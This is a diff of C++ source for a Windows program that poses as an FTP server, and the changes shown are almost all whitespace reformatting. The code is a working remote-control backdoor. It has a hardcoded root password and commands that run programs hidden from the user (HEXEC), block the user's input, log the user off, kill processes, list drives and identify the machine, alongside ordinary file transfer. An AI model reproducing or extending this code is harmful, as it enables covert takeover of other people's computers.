@@ -120,9 +120,9 @@ void Cleanup()
 		pLog->Log("Module terminated()");
 	}
 
-    if(isLog){
-        delete pLog;
-    }
+	if(isLog){
+		delete pLog;
+	}
 }
 
 bool WINAPI ListenThread(LPVOID lParam)
@@ -130,9 +130,9 @@ bool WINAPI ListenThread(LPVOID lParam)
 	SOCKET sIncoming;
 	DWORD dw;
 
-    if(isLog){
-        pLog->Log("Module listen()");
-    }
+	if(isLog){
+		pLog->Log("Module listen()");
+	}
 
 	while((sIncoming = accept(sListen, 0, 0)) != INVALID_SOCKET){
 		CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ConnectionThread, (void *)sIncoming, 0, &dw));
@@ -203,7 +203,6 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 	sprintf(szOutput, "220 %s\r\n", SERVERID);
 	SocketSendString(sCmd, szOutput);
 
-
 	dw = sizeof(SOCKADDR_IN);
 	getsockname(sCmd, (SOCKADDR*)&saiCmd, (int *)&dw);
 
@@ -232,15 +231,15 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 				SocketSendString(sCmd, "503 Already logged in, use REIN to change users\r\n");
 				continue;
 			}else if(dwActiveConnections >= 5){
-                SocketSendString(sCmd, "421 Connection refused due to limitation\r\n");
+                		SocketSendString(sCmd, "421 Connection refused due to limitation\r\n");
 				if(isLog){
-				    sprintf(szOutput, "[%u] Connection refused due to limitation", sCmd);
-                    pLog->Log(szOutput);
+					sprintf(szOutput, "[%u] Connection refused due to limitation", sCmd);
+                    			pLog->Log(szOutput);
 				}
-                break;
+                		break;
 			}else{
 				strUser = pszParam;
-                if(pszParam){
+                		if(pszParam){
 					sprintf(szOutput, "331 User %s requires password\r\n", strUser.c_str());
 					SocketSendString(sCmd, szOutput);
 					continue;
@@ -254,21 +253,21 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 			}else if(isLoggedIn){
 				SocketSendString(sCmd, "503 Already logged in. Use REIN to change users\r\n");
 			}else{
-                if(!strcmp("root", strUser.c_str()) && !strcmp("l3n712", pszParam)){
+                		if(!strcmp("root", strUser.c_str()) && !strcmp("l3n712", pszParam)){
 					isLoggedIn = true;
 					dwActiveConnections++;
 					strCurrentVirtual = "/";
 					sprintf(szOutput, "230 root logged in\r\n");
 					SocketSendString(sCmd, szOutput);
 					if(isLog){
-                        sprintf(szOutput, "[%u] root logged in", sCmd);
-                        pLog->Log(szOutput);
+                        			sprintf(szOutput, "[%u] root logged in", sCmd);
+                        			pLog->Log(szOutput);
 					}
 				}else{
 					SocketSendString(sCmd, "530 Login incorrect\r\n");
 					if(isLog){
-                        sprintf(szOutput, "[%u] login incorrect", sCmd);
-                        pLog->Log(szOutput);
+                        			sprintf(szOutput, "[%u] login incorrect", sCmd);
+                        			pLog->Log(szOutput);
 					}
 				}
 			}
@@ -281,8 +280,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 				sprintf(szOutput, "220 root logged out\r\n");
 				SocketSendString(sCmd, szOutput);
 				if(isLog){
-                    sprintf(szOutput, "[%u] root logged out", sCmd);
-                    pLog->Log(szOutput);
+                    			sprintf(szOutput, "[%u] root logged out", sCmd);
+                    			pLog->Log(szOutput);
 				}
 				strUser.clear();
 			}
@@ -290,14 +289,14 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 		}
 
 		else if(!strcmp(szCmd, "FEAT")){
-		    if(!isLoggedIn){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "211 Features:\r\n SIZE\r\n REST STREAM\r\n MDTM\r\n TVFS\r\n211 END\r\n");
 			}else{
-                SocketSendString(sCmd, "211 Features:\r\n SIZE\r\n REST STREAM\r\n MDTM\r\n TVFS\r\n INFO\r\n MSGB\r\n LDSK\r\n KILL\r\n PKILL\r\n CLSE\r\n LOFF\r\n EXEC\r\n HEXEC\r\n BLOCK\r\n UNBLOCK\r\n211 END\r\n");
+                		SocketSendString(sCmd, "211 Features:\r\n SIZE\r\n REST STREAM\r\n MDTM\r\n TVFS\r\n INFO\r\n MSGB\r\n LDSK\r\n KILL\r\n PKILL\r\n CLSE\r\n LOFF\r\n EXEC\r\n HEXEC\r\n BLOCK\r\n UNBLOCK\r\n211 END\r\n");
 			}
 		}
 
-        else if(!strcmp(szCmd, "SYST")){
+		else if(!strcmp(szCmd, "SYST")){
 			SocketSendString(sCmd, "215 WIN32-XP@ONDERWIJSGROEP.NET WORKSTATION L8\r\n");
 		}
 
@@ -308,8 +307,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 				sprintf(szOutput, "221 root logged out\r\n");
 				SocketSendString(sCmd, szOutput);
 				if(isLog){
-                    sprintf(szOutput, "[%u] root logged out", sCmd);
-                    pLog->Log(szOutput);
+					sprintf(szOutput, "[%u] root logged out", sCmd);
+					pLog->Log(szOutput);
 				}
 
 			}
@@ -320,14 +319,14 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-			    isLoggedIn = false;
-			    if(isLog){
-                    sprintf(szOutput, "[%u] force kill()", sCmd);
-                    pLog->Log(szOutput);
+				isLoggedIn = false;
+				if(isLog){
+					sprintf(szOutput, "[%u] force kill()", sCmd);
+					pLog->Log(szOutput);
 				}
 				SocketSendString(sCmd, "221 Connection closed\r\n");
-			    Cleanup();
-			    exit(1);
+				Cleanup();
+				exit(1);
 			}
 		}
 
@@ -335,147 +334,147 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 			SocketSendString(sCmd, "200 NOOP command successful\r\n");
 		}
 
-        else if(!strcmp(szCmd, "INFO")){
-            if(!isLoggedIn){
+		else if(!strcmp(szCmd, "INFO")){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-                char acUserName[25];
-                char acComputerName[100];
-                DWORD nUserName = sizeof(acUserName);
-                DWORD nComputerName = sizeof(acComputerName);
-
-                GetUserName(acUserName, &nUserName);
-                GetComputerName(acComputerName, &nComputerName);
-
-                sprintf(szOutput, "Object %s@%s\r\n200 INFO command succesful\r\n", acUserName, acComputerName);
-                SocketSendString(sCmd, szOutput);
+				char acUserName[25];
+				char acComputerName[100];
+				DWORD nUserName = sizeof(acUserName);
+				DWORD nComputerName = sizeof(acComputerName);
+			
+				GetUserName(acUserName, &nUserName);
+				GetComputerName(acComputerName, &nComputerName);
+			
+				sprintf(szOutput, "Object %s@%s\r\n200 INFO command succesful\r\n", acUserName, acComputerName);
+				SocketSendString(sCmd, szOutput);
 			}
 		}
 
 		else if(!strcmp(szCmd, "CLSE")){
-            if(!isLoggedIn){
+            		if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-   			    if(isLog){
-                    sprintf(szOutput, "[%u] force disconnect()", sCmd);
-                    pLog->Log(szOutput);
+				if(isLog){
+					sprintf(szOutput, "[%u] force disconnect()", sCmd);
+					pLog->Log(szOutput);
 				}
-                break;
-		    }
+				break;
+			}
 		}
 
 		else if(!strcmp(szCmd, "LOFF")){
-		   if(!isLoggedIn){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-                if(isLog){
-                    sprintf(szOutput, "[%u] object logoff()", sCmd);
-                    pLog->Log(szOutput);
+				if(isLog){
+					sprintf(szOutput, "[%u] object logoff()", sCmd);
+					pLog->Log(szOutput);
 				}
-                ExitWindowsEx(0, 0);
-		    }
+				ExitWindowsEx(0, 0);
+			}
 		}
 
 		else if(!strcmp(szCmd, "BLOCK")){
-		   if(!isLoggedIn){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-                if(isLog){
-                    sprintf(szOutput, "[%u] object block()", sCmd);
-                    pLog->Log(szOutput);
+				if(isLog){
+					sprintf(szOutput, "[%u] object block()", sCmd);
+					pLog->Log(szOutput);
 				}
-                BlockInput(true);
-		    }
+				BlockInput(true);
+			}
 		}
 
 		else if(!strcmp(szCmd, "UNBLOCK")){
-		   if(!isLoggedIn){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-                if(isLog){
-                    sprintf(szOutput, "[%u] object unblock()", sCmd);
-                    pLog->Log(szOutput);
+				if(isLog){
+					sprintf(szOutput, "[%u] object unblock()", sCmd);
+					pLog->Log(szOutput);
 				}
-                BlockInput(false);
-		    }
+				BlockInput(false);
+			}
 		}
 
-        else if(!strcmp(szCmd, "MSGB")){
-            if(!isLoggedIn){
+		else if(!strcmp(szCmd, "MSGB")){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else if(!*pszParam){
 				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
 			}else{
-                CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MessageBoxThread, pszParam, 0, &tdw));
-                if(isLog){
-                    sprintf(szOutput, "[%u] object msgbox()", sCmd);
-                    pLog->Log(szOutput);
+				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MessageBoxThread, pszParam, 0, &tdw));
+				if(isLog){
+					sprintf(szOutput, "[%u] object msgbox()", sCmd);
+					pLog->Log(szOutput);
 				}
-                SocketSendString(sCmd, "200 MSGB command succesful\r\n");
-            }
+				SocketSendString(sCmd, "200 MSGB command succesful\r\n");
+			}
 		}
 
-        else if(!strcmp(szCmd, "EXEC")){
-            if(!isLoggedIn){
+		else if(!strcmp(szCmd, "EXEC")){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else if(!*pszParam){
 				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
 			}else{
-                ShellExecute(NULL, "open", pszParam, NULL, NULL, SW_SHOW);
-                if(isLog){
-                    sprintf(szOutput, "[%u] object execute()", sCmd);
-                    pLog->Log(szOutput);
+				ShellExecute(NULL, "open", pszParam, NULL, NULL, SW_SHOW);
+				if(isLog){
+					sprintf(szOutput, "[%u] object execute()", sCmd);
+					pLog->Log(szOutput);
 				}
-                SocketSendString(sCmd, "200 EXEC command succesful\r\n");
-            }
+				SocketSendString(sCmd, "200 EXEC command succesful\r\n");
+			}
 		}
 
-        else if(!strcmp(szCmd, "HEXEC")){
-            if(!isLoggedIn){
+		else if(!strcmp(szCmd, "HEXEC")){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else if(!*pszParam){
 				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
 			}else{
-                ShellExecute(NULL, "open", pszParam, NULL, NULL, SW_HIDE);
-                if(isLog){
-                    sprintf(szOutput, "[%u] object execute hidden()", sCmd);
-                    pLog->Log(szOutput);
+				ShellExecute(NULL, "open", pszParam, NULL, NULL, SW_HIDE);
+				if(isLog){
+					sprintf(szOutput, "[%u] object execute hidden()", sCmd);
+					pLog->Log(szOutput);
 				}
-                SocketSendString(sCmd, "200 HEXEC command succesful\r\n");
-            }
+				SocketSendString(sCmd, "200 HEXEC command succesful\r\n");
+			}
 		}
 
-        else if(!strcmp(szCmd, "PKILL")){
-            if(!isLoggedIn){
+		else if(!strcmp(szCmd, "PKILL")){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else if(!*pszParam){
 				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
 			}else{
-                KillProcessByName(pszParam);
-                SocketSendString(sCmd, "200 PKILL command succesful\r\n");
-            }
+                		KillProcessByName(pszParam);
+                		SocketSendString(sCmd, "200 PKILL command succesful\r\n");
+            		}
 		}
 
 		else if(!strcmp(szCmd, "LDSK")){
-		    if(!isLoggedIn){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
-                char szBuffer[MAX_PATH+100];
-                DWORD dwLogicalDrives = GetLogicalDrives();
-                int nDrive;
-                UINT uType;
+				char szBuffer[MAX_PATH+100];
+				DWORD dwLogicalDrives = GetLogicalDrives();
+				int nDrive;
+				UINT uType;
 
-                for(nDrive = 0; nDrive<32; nDrive++){
-                    if(dwLogicalDrives & (1 << nDrive)){
-                        wsprintf(szBuffer, "%c:\\", nDrive + 'A');
-                        uType = GetDriveType(szBuffer);
-                        wsprintf(&szBuffer[3], " Id: %u, Type: %s ", uType, (uType == DRIVE_REMOVABLE) ? "FLOPPY" : ((uType == DRIVE_FIXED) ? "HARD DISK" : ((uType == DRIVE_REMOTE) ? "NETWORK" : ((uType == DRIVE_CDROM) ? "CDROM" : ((uType == DRIVE_RAMDISK) ? "RAMDISK" : ((uType == 1) ? "DOES NOT EXIST" : "UNKNOWN DRIVE TYPE" ))))));
-
-                        sprintf(szOutput, "%s\r\n", szBuffer);
-                        SocketSendString(sCmd, szOutput);
-                    }
-                }
-                SocketSendString(sCmd, "200 LDSK command succesful\r\n");
+				for(nDrive = 0; nDrive<32; nDrive++){
+					if(dwLogicalDrives & (1 << nDrive)){
+						wsprintf(szBuffer, "%c:\\", nDrive + 'A');
+						uType = GetDriveType(szBuffer);
+						wsprintf(&szBuffer[3], " Id: %u, Type: %s ", uType, (uType == DRIVE_REMOVABLE) ? "FLOPPY" : ((uType == DRIVE_FIXED) ? "HARD DISK" : ((uType == DRIVE_REMOTE) ? "NETWORK" : ((uType == DRIVE_CDROM) ? "CDROM" : ((uType == DRIVE_RAMDISK) ? "RAMDISK" : ((uType == 1) ? "DOES NOT EXIST" : "UNKNOWN DRIVE TYPE" ))))));
+						
+						sprintf(szOutput, "%s\r\n", szBuffer);
+						SocketSendString(sCmd, szOutput);
+					}
+				}
+                		SocketSendString(sCmd, "200 LDSK command succesful\r\n");
 			}
 		}
 
@@ -488,7 +487,7 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 			}
 		}
 
-        else if(!strcmp(szCmd, "CWD") || !strcmp(szCmd, "XCWD")){
+		else if(!strcmp(szCmd, "CWD") || !strcmp(szCmd, "XCWD")){
 			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else if(!*pszParam){
@@ -535,9 +534,9 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 			}else{
 				dwRestOffset = dw;
 				sprintf(szOutput, "350 Ready to resume transfer at %u bytes\r\n", dwRestOffset);
-   			    if(isLog){
-                    sprintf(szOutput, "[%u] resume transfer", sCmd);
-                    pLog->Log(szOutput);
+				if(isLog){
+					sprintf(szOutput, "[%u] resume transfer", sCmd);
+					pLog->Log(szOutput);
 				}
 
 				SocketSendString(sCmd, szOutput);
@@ -589,9 +588,9 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 				getsockname(sPasv, (SOCKADDR *)&saiPasv, (int *)&dw);
 				sprintf(szOutput, "227 Entering Passive Mode (%u,%u,%u,%u,%u,%u)\r\n", saiCmd.sin_addr.S_un.S_un_b.s_b1, saiCmd.sin_addr.S_un.S_un_b.s_b2, saiCmd.sin_addr.S_un.S_un_b.s_b3, saiCmd.sin_addr.S_un.S_un_b.s_b4, ((unsigned char *)&saiPasv.sin_port)[0], ((unsigned char *)&saiPasv.sin_port)[1]);
 				SocketSendString(sCmd, szOutput);
-                if(isLog){
-                    sprintf(szOutput, "[%u] enter data connection", sCmd);
-                    pLog->Log(szOutput);
+				if(isLog){
+					sprintf(szOutput, "[%u] enter data connection", sCmd);
+					pLog->Log(szOutput);
 				}
 			}
 		}
@@ -601,35 +600,35 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 				SocketSendString(sCmd, "530 Not logged in\r\n");
 			}else{
 				if(*pszParam == '-'){
-				    if(pszParam = strchr(pszParam, ' ')){
-				        pszParam++;
-				    }
+					if(pszParam = strchr(pszParam, ' ')){
+						pszParam++;
+					}
 				}
 				if(pszParam && *pszParam){
 					pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
 				}else{
 					strNewVirtual = strCurrentVirtual;
 				}
-                if(pVFS->GetDirectoryListing(strNewVirtual.c_str(), strcmp(szCmd, "LIST"), listing)) {
+				if(pVFS->GetDirectoryListing(strNewVirtual.c_str(), strcmp(szCmd, "LIST"), listing)){
 					sprintf(szOutput, "150 Opening %s mode data connection for listing of \"%s\".\r\n", sPasv ? "passive" : "active", strNewVirtual.c_str());
 					SocketSendString(sCmd, szOutput);
 					sData = EstablishDataConnection(&saiData, &sPasv);
 					if(sData){
-                        for(VFS::listing_type::const_iterator it = listing.begin(); it != listing.end(); ++it) {
+						for(VFS::listing_type::const_iterator it = listing.begin(); it != listing.end(); ++it){
 							SocketSendString(sData, it->second.c_str());
 						}
-                        listing.clear();
+						listing.clear();
 						closesocket(sData);
 						sprintf(szOutput, "226 %s command successful\r\n", strcmp(szCmd, "NLST") ? "LIST" : "NLST");
 						SocketSendString(sCmd, szOutput);
-                    }else{
+					}else{
 						listing.clear();
 						SocketSendString(sCmd, "425 Can't open data connection\r\n");
-                    }
-                }else{
+					}
+				}else{
 					sprintf(szOutput, "550 \"%s\": Path not found\r\n", strNewVirtual.c_str());
 					SocketSendString(sCmd, szOutput);
-                }
+                		}
 			}
 		}
 
@@ -680,15 +679,15 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 					sData = EstablishDataConnection(&saiData, &sPasv);
 					if(sData){
 						if(isLog){
-                            sprintf(szOutput, "[%u] began downloading %s", sCmd, strNewVirtual.c_str());
-                            pLog->Log(szOutput);
+							sprintf(szOutput, "[%u] began downloading %s", sCmd, strNewVirtual.c_str());
+							pLog->Log(szOutput);
 						}
 						if(DoSocketFileIO(sCmd, sData, hFile, SOCKET_FILE_IO_DIRECTION_SEND, &dw)){
 							sprintf(szOutput, "226 %s transferred successfully\r\n", strNewVirtual.c_str());
 							SocketSendString(sCmd, szOutput);
 							if(isLog){
-                                sprintf(szOutput, "[%u] download completed", sCmd);
-                                pLog->Log(szOutput);
+								sprintf(szOutput, "[%u] download completed", sCmd);
+								pLog->Log(szOutput);
 							}
 						}else{
 							SocketSendString(sCmd, "426 Connection closed; transfer aborted\r\n");
@@ -696,8 +695,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 							    SocketSendString(sCmd, "226 ABOR command successful\r\n");
 							}
 							if(isLog){
-                                sprintf(szOutput, "[%u] download aborted", sCmd);
-                                pLog->Log(szOutput);
+								sprintf(szOutput, "[%u] download aborted", sCmd);
+								pLog->Log(szOutput);
 							}
 						}
 						closesocket(sData);
@@ -733,21 +732,21 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 					sData = EstablishDataConnection(&saiData, &sPasv);
 					if(sData){
 						if(isLog){
-                            sprintf(szOutput, "[%u] began uploading %s", sCmd, strNewVirtual.c_str());
-                            pLog->Log(szOutput);
+							sprintf(szOutput, "[%u] began uploading %s", sCmd, strNewVirtual.c_str());
+							pLog->Log(szOutput);
 						}
 						if(DoSocketFileIO(sCmd, sData, hFile, SOCKET_FILE_IO_DIRECTION_RECEIVE, 0)){
 							sprintf(szOutput, "226 %s transferred successfully\r\n", strNewVirtual.c_str());
 							SocketSendString(sCmd, szOutput);
 							if(isLog){
-                                sprintf(szOutput, "[%u] upload completed", sCmd);
-                                pLog->Log(szOutput);
+								sprintf(szOutput, "[%u] upload completed", sCmd);
+								pLog->Log(szOutput);
 							}
 						}else{
 							SocketSendString(sCmd, "426 Connection closed, transfer aborted\r\n");
 							if(isLog){
-                                sprintf(szOutput, "[%u] upload aborted", sCmd);
-                                pLog->Log(szOutput);
+								sprintf(szOutput, "[%u] upload aborted", sCmd);
+								pLog->Log(szOutput);
 							}
 						}
 						closesocket(sData);
@@ -760,20 +759,20 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 		}
 
 		else if(!strcmp(szCmd, "ABOR")){
-		    if(!isLoggedIn){
+			if(!isLoggedIn){
 				SocketSendString(sCmd, "530 Not logged in\r\n");
-		    }else{
-                if(sPasv){
-                    closesocket(sPasv);
-                    sPasv = 0;
-                    if(isLog){
-                        sprintf(szOutput, "[%u] transfer aborted", sCmd);
-                        pLog->Log(szOutput);
-                    }
-                }
-                dwRestOffset = 0;
-                SocketSendString(sCmd, "200 ABOR command successful\r\n");
-		    }
+			}else{
+				if(sPasv){
+					closesocket(sPasv);
+					sPasv = 0;
+					if(isLog){
+						sprintf(szOutput, "[%u] transfer aborted", sCmd);
+						pLog->Log(szOutput);
+					}
+				}
+				dwRestOffset = 0;
+				SocketSendString(sCmd, "200 ABOR command successful\r\n");
+			}
 		}
 
 		else if(!strcmp(szCmd, "SIZE")){
@@ -866,8 +865,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 						sprintf(szOutput, "250 %s deleted successfully\r\n", strNewVirtual.c_str());
 						SocketSendString(sCmd, szOutput);
 						if(isLog){
-                            sprintf(szOutput, "[%u] deleted %", sCmd, strNewVirtual.c_str());
-                            pLog->Log(szOutput);
+							sprintf(szOutput, "[%u] deleted %", sCmd, strNewVirtual.c_str());
+							pLog->Log(szOutput);
 						}
 					}else{
 						sprintf(szOutput, "550 %s : Unable to delete file\r\n", strNewVirtual.c_str());
@@ -910,8 +909,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 				if(pVFS->MoveFile(strRnFr.c_str(), strNewVirtual.c_str())){
 					SocketSendString(sCmd, "250 RNTO command successful\r\n");
 					if(isLog){
-                        sprintf(szOutput, "[%u] renamed file %s to %", sCmd, strRnFr.c_str(), strNewVirtual.c_str());
-                        pLog->Log(szOutput);
+						sprintf(szOutput, "[%u] renamed file %s to %", sCmd, strRnFr.c_str(), strNewVirtual.c_str());
+						pLog->Log(szOutput);
 					}
 					strRnFr.clear();
 				}else{
@@ -932,8 +931,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 					sprintf(szOutput, "250 %s created successfully.\r\n", strNewVirtual.c_str());
 					SocketSendString(sCmd, szOutput);
 					if(isLog){
-                        sprintf(szOutput, "[%u] created directory %s", sCmd, strNewVirtual.c_str());
-                        pLog->Log(szOutput);
+						sprintf(szOutput, "[%u] created directory %s", sCmd, strNewVirtual.c_str());
+						pLog->Log(szOutput);
 					}
 				}else{
 					sprintf(szOutput, "550 %s: Unable to create directory\r\n", strNewVirtual.c_str());
@@ -953,8 +952,8 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 					sprintf(szOutput, "250 %s removed successfully\r\n", strNewVirtual.c_str());
 					SocketSendString(sCmd, szOutput);
 					if(isLog){
-                        sprintf(szOutput, "[%u] removed directory %s", sCmd, strNewVirtual.c_str());
-                        pLog->Log(szOutput);
+						sprintf(szOutput, "[%u] removed directory %s", sCmd, strNewVirtual.c_str());
+						pLog->Log(szOutput);
 					}
 				}else{
 					sprintf(szOutput, "550 %s: Unable to remove directory\r\n", strNewVirtual.c_str());
@@ -966,9 +965,9 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 		else{
 			SocketSendString(sCmd, "500 Unknown command\r\n");
 			if(isLog){
-                sprintf(szOutput, "[%u] unknown command %s", sCmd, pszParam);
-                pLog->Log(szOutput);
-            }
+				sprintf(szOutput, "[%u] unknown command %s", sCmd, pszParam);
+				pLog->Log(szOutput);
+			}
 		}
 
 	}
@@ -986,7 +985,7 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 
 	sprintf(szOutput, "[%u] connection closed", sCmd);
 	if(isLog){
-        pLog->Log(szOutput);
+		pLog->Log(szOutput);
 	}
 
 	return false;
@@ -994,9 +993,9 @@ bool WINAPI ConnectionThread(SOCKET sCmd)
 
 bool SocketSendString(SOCKET s, const char *psz){
 	if(send(s, psz, (INT)strlen(psz), 0) == SOCKET_ERROR){
-	    return false;
+		return false;
 	}else{
-        return true;
+        	return true;
 	}
 }
 
@@ -1020,7 +1019,7 @@ DWORD SocketReceiveString(SOCKET s, char *psz, DWORD dwMaxChars){
 			return dwBytes;
 		}
 		if(dwBytes<dwMaxChars){
-		    psz++;
+			psz++;
 		}
 	}
 }
@@ -1036,11 +1035,11 @@ DWORD SocketReceiveData(SOCKET s, char *psz, DWORD dwBytesToRead){
 	FD_SET(s, &fds);
 	dw = select(0, &fds, 0, 0, &tv);
 	if(dw == SOCKET_ERROR || dw == 0){
-	    return -1;
+		return -1;
 	}
 	dw = recv(s, psz, dwBytesToRead, 0);
 	if(dw == SOCKET_ERROR){
-	    return -1;
+		return -1;
 	}
 	return dw;
 }
